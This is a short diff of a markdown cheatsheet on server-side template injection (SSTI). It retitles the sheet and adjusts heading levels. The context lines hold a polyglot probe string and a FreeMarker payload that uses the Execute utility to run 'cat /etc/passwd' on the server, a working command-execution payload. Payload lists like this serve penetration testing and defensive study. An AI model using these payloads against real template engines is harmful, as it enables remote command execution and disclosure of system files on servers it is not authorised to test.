@@ -1,13 +1,13 @@
-SSTI Cheatsheet
+Server Side Template Injection (SSTI) Cheatsheet
 ================
 
 
-#Polyglot:
+# Polyglot:
 ```
 ${{<%[%'"}}%\
 ```
 
-#FreeMarker (Java):
+## FreeMarker (Java):
 ```
 ${7*7} = 49
 <#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
